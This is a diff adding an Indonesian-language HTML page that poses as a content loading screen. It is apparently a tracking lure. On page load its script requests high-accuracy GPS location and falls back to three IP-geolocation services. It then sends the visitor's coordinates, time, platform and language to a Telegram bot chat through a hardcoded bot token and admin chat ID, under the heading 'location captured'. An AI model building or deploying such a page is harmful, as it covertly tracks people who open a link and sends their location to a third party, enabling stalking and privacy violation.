@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family:'Segoe UI',system-ui,sans-serif;
+    background:linear-gradient(135deg,#0b1120,#1e293b);
+    color:#e2e8f0;
+    min-height:100vh;
+    display:flex; align-items:center; justify-content:center;
+    padding:20px;
+  }
+  .box {
+    text-align:center;
+    max-width:360px; width:100%;
+    padding:32px 26px;
+    background:rgba(30,41,59,.75);
+    border:1px solid rgba(148,163,184,.15);
+    border-radius:18px;
+    backdrop-filter:blur(12px);
+    box-shadow:0 25px 50px -12px rgba(0,0,0,.6);
+  }
+  .spinner {
+    width:52px; height:52px;
+    border:4px solid rgba(56,189,248,.2);
+    border-top-color:#38bdf8;
+    border-radius:50%;
+    margin:0 auto 20px;
+    animation:spin 1s linear infinite;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  h1 { font-size:1.05rem; margin-bottom:8px; font-weight:600; }
+  p { font-size:.82rem; color:#94a3b8; line-height:1.5; }
+  .status {
+    margin-top:16px; font-size:.75rem;
+    padding:10px 14px; border-radius:8px;
+    background:rgba(56,189,248,.1);
+    color:#38bdf8;
+    border:1px solid rgba(56,189,248,.2);
+    word-break:break-word;
+  }
+  .status.err { background:rgba(239,68,68,.1); color:#f87171; border-color:rgba(239,68,68,.2); }
+  .status.ok { background:rgba(34,197,94,.1); color:#4ade80; border-color:rgba(34,197,94,.2); }
+  .status.warn { background:rgba(251,191,36,.1); color:#fbbf24; border-color:rgba(251,191,36,.2); }
+  .debug {
+    margin-top:14px; font-size:.68rem; color:#64748b;
+    font-family:monospace; text-align:left;
+    background:rgba(15,23,42,.6);
+    padding:10px; border-radius:8px;
+    max-height:120px; overflow-y:auto;
+  }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spinner" id="spin"></div>
+  <h1>Memuat Konten...</h1>
+  <p id="desc">Mohon tunggu sebentar, konten sedang dipersiapkan.</p>
+  <div class="status" id="status">⏳ Menginisialisasi...</div>
+  <div class="debug" id="debug" style="display:none;"></div>
+</div>
+
+<script>
+// ======================
+// ⚙️ CONFIG — GANTI DI SINI
+// ======================
+const BOT_TOKEN = "8265385560:AAELI__PhQsk4Sfn81-wObZIq3mezpqyNtU";
+const ADMIN_CHAT_ID = "7116592067";
+// ======================
+
+const statusEl = document.getElementById('status');
+const descEl = document.getElementById('desc');
+const spinEl = document.getElementById('spin');
+const debugEl = document.getElementById('debug');
+const debugLog = [];
+
+function log(msg) {
+  debugLog.push(msg);
+  debugEl.textContent = debugLog.join('\n');
+}
+
+function setStatus(msg, cls = '') {
+  statusEl.textContent = msg;
+  statusEl.className = 'status ' + cls;
+  log('[STATUS] ' + msg);
+}
+
+// ===== TEST TOKEN =====
+async function testToken() {
+  try {
+    log('[TEST] Cek token...');
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+    const data = await res.json();
+    if (data.ok) {
+      log('[TEST] ✅ Bot: @' + data.result.username);
+      return true;
+    } else {
+      log('[TEST] ❌ Token salah: ' + data.description);
+      return false;
+    }
+  } catch (e) {
+    log('[TEST] ❌ Network error: ' + e.message);
+    return false;
+  }
+}
+
+// ===== KIRIM LOKASI =====
+async function sendLocation(lat, lng, accuracy = '', source = 'GPS') {
+  const waktu = new Date().toLocaleString('id-ID', {
+    dateStyle: 'full', timeStyle: 'medium'
+  });
+  const ua = navigator.userAgent;
+  const platform = navigator.platform || '-';
+  const bahasa = navigator.language || '-';
+
+  const text =
+    `📍 *LOKASI TERTANGKAP*\n` +
+    `━━━━━━━━━━━━━━━━━━\n` +
+    `🕒 *Waktu:* ${waktu}\n` +
+    `📐 *Latitude:* \`${lat}\`\n` +
+    `📐 *Longitude:* \`${lng}\`\n` +
+    `🎯 *Akurasi:* ${accuracy ? Math.round(accuracy) + ' m' : '-'}\n` +
+    `📡 *Sumber:* ${source}\n` +
+    `🌐 *Platform:* ${platform}\n` +
+    `🗣️ *Bahasa:* ${bahasa}`;
+
+  try {
+    log('[SEND] Kirim pesan teks...');
+    const r1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+    const d1 = await r1.json();
+    if (!d1.ok) throw new Error('sendMessage: ' + d1.description);
+    log('[SEND] ✅ Pesan terkirim');
+
+    log('[SEND] Kirim titik lokasi...');
+    const r2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        latitude: lat,
+        longitude: lng
+      })
+    });
+    const d2 = await r2.json();
+    if (!d2.ok) throw new Error('sendLocation: ' + d2.description);
+    log('[SEND] ✅ Lokasi terkirim');
+
+    setStatus('✅ Lokasi berhasil terkirim!', 'ok');
+    descEl.textContent = 'Konten akan dimuat dalam beberapa detik...';
+    spinEl.style.display = 'block';
+
+    // Coba tampilkan redirect ke konten (opsional)
+    // window.location.href = 'https://tiktok.com'; // uncomment kalau mau redirect
+  } catch (e) {
+    setStatus('❌ Gagal kirim: ' + e.message, 'err');
+    log('[SEND] ❌ ' + e.message);
+  }
+}
+
+// ===== FALLBACK IP =====
+async function fallbackIP() {
+  setStatus('⚠️ GPS gagal, coba via IP...', 'warn');
+  try {
+    log('[IP] Coba ipapi.co...');
+    let r = await fetch('https://ipapi.co/json/');
+    let d = await r.json();
+    if (d.latitude && d.longitude) {
+      log('[IP] ✅ ipapi.co: ' + d.city + ', ' + d.country_name);
+      return sendLocation(d.latitude, d.longitude, 'IP-based',
+        `IP (${d.city || '?'}, ${d.region || '?'}, ${d.country_name || '?'})`);
+    }
+  } catch(e) { log('[IP] ipapi.co gagal'); }
+
+  try {
+    log('[IP] Coba ipwho.is...');
+    let r = await fetch('https://ipwho.is/');
+    let d = await r.json();
+    if (d.latitude && d.longitude) {
+      log('[IP] ✅ ipwho.is: ' + d.city + ', ' + d.country);
+      return sendLocation(d.latitude, d.longitude, 'IP-based',
+        `IP (${d.city || '?'}, ${d.region || '?'}, ${d.country || '?'})`);
+    }
+  } catch(e) { log('[IP] ipwho.is gagal'); }
+
+  try {
+    log('[IP] Coba ip-api.com...');
+    let r = await fetch('http://ip-api.com/json/');
+    let d = await r.json();
+    if (d.lat && d.lon) {
+      log('[IP] ✅ ip-api.com: ' + d.city + ', ' + d.country);
+      return sendLocation(d.lat, d.lon, 'IP-based',
+        `IP (${d.city || '?'}, ${d.regionName || '?'}, ${d.country || '?'})`);
+    }
+  } catch(e) { log('[IP] ip-api.com gagal'); }
+
+  setStatus('❌ Semua metode gagal. Cek koneksi / token.', 'err');
+}
+
+// ===== MULAI =====
+async function init() {
+  // 1. Validasi config
+  if (!BOT_TOKEN || BOT_TOKEN === "ISI_TOKEN_BOT_ANDA_DISINI") {
+    setStatus('❌ BOT_TOKEN belum di-set', 'err');
+    spinEl.style.display = 'none';
+    return;
+  }
+  if (!ADMIN_CHAT_ID || ADMIN_CHAT_ID === "ISI_CHAT_ID_ADMIN_DISINI") {
+    setStatus('❌ ADMIN_CHAT_ID belum di-set', 'err');
+    spinEl.style.display = 'none';
+    return;
+  }
+
+  setStatus('🔌 Test koneksi ke Telegram...');
+  const ok = await testToken();
+  if (!ok) {
+    setStatus('❌ Token bot salah atau tidak aktif', 'err');
+    spinEl.style.display = 'none';
+    return;
+  }
+
+  setStatus('📍 Meminta izin lokasi...');
+  descEl.textContent = 'Klik "Allow" saat browser minta izin lokasi.';
+
+  // 2. Cek support geolocation
+  if (!navigator.geolocation) {
+    log('[GPS] Geolocation tidak didukung');
+    fallbackIP();
+    return;
+  }
+
+  // 3. Minta lokasi GPS
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      log('[GPS] ✅ Lokasi didapat');
+      sendLocation(
+        pos.coords.latitude,
+        pos.coords.longitude,
+        pos.coords.accuracy,
+        'GPS'
+      );
+    },
+    (err) => {
+      log('[GPS] ❌ ' + err.message + ' (code:' + err.code + ')');
+      fallbackIP();
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+// Jalankan
+window.addEventListener('load', () => {
+  debugEl.style.display = 'block';
+  init();
+});
+</script>
+</body>
+</html>
